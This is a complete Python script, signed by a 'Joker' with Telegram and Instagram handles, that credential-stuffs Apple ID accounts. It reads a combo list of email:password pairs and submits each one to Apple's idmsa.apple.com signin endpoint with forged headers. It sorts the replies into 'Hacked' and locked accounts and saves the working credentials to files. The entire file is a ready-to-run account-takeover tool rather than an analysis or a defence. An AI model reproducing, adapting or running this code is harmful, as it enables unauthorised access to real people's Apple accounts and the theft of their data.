try:
	import requests,threading
	from time import sleep
	Lists='V4^c_Yf4TEw'
except Exception as Joker:exit(Joker)
PRNT = threading.Lock()
r=requests.session()
def vv1ck(*a, **b):
	with PRNT:
		print(*a, **b)
print("""
    ___   Brute Force  __        ________  
   /   |  ____  ____  / /__     /  _/ __ \   
  / /| | / __ \/ __ \/ / _ \    / // / / / 
 / ___ |/ /_/ / /_/ / /  __/  _/ // /_/ /   
/_/  |_/ .___/ .___/_/\___/  /___/_____/    
      /_/   /_/""")
error = '"الـ Apple ID الخاص بك أو كلمة السر غير صحيحة."'
error2="تم قفل هذا الـ Apple ID"
yes = 'authType'
donE=20
hi='I always see you :)'
def ApplID_Check(applID,pess):
	headers={"Accept": "application/json, text/javascript, */*; q=0.01","User-Agent": "Mozilla/5.0 (joker@vv1ck) Gecko/20100101 Firefox/91.0","X-Apple-Locale":"QT-AR","X-Apple-Trusted-Domain": "https://idmsa.apple.com","Origin": "https://idmsa.apple.com","X-Requested-With": "XMLHttpRequest"}
	send = r.post('https://idmsa.apple.com/appleauth/auth/signin',headers=headers,json={"accountName":applID,"rememberMe":"false","password":pess}).text
	if yes in send:
		vv1ck(f'[+] Hacked appID: {applID} | password : {pess}')
		with open('Hacked-appleID.txt', 'a') as J:
			J.write(applID+':'+pess+' |@vv1ck\n')
	elif error in send:
		vv1ck(f'[-] Not Hacked appID: {applID}')
	elif error2 in send:
		vv1ck(f'[!] This apple id locked: {applID} | password : {pess}')
		with open('closed-appleID.txt', 'a') as J:
			J.write(applID+':'+pess+' |@vv1ck\n')
	else:pass
Lis='V4^c_Yf4TEw'
def AppleID_File():
	QTR = input('\n[+] Enter the name the combo appleID file: ')
	try:
		vv1ck('\n\t ━━━━━━━━━━━━ Started ━━━━━━━━━━━━\n')
		sleep(0.5)
		for x in open(QTR,'r').read().splitlines():
			if x ==None:exit('\n     ========== completed =========')
			try:applID = x.split(":")[0]
			except IndexError:exit('\n     ========== completed =========')
			try:
				pess = x.split(":")[1]
				sleep(1)
				ApplID_Check(applID,pess)
			except IndexError:pass
	except FileNotFoundError:
		vv1ck('\n[-] The file name is incorrect !\n')
		return AppleID_File()
def AppleID_True():
	if Lis in Lists:pass
	else:exit('Okay..')
	JOlist=[]
	for JJNN1 in Lists:
		posi=ord(JJNN1)
		NW=chr(posi-donE)
		JOlist.append(NW)
	DN=''.join(JOlist)
	print('\t\t\t\t\t'+DN)
	AppleID_File()
AppleID_True()
# By Joker telegram : vv1ck / isnta: 221298
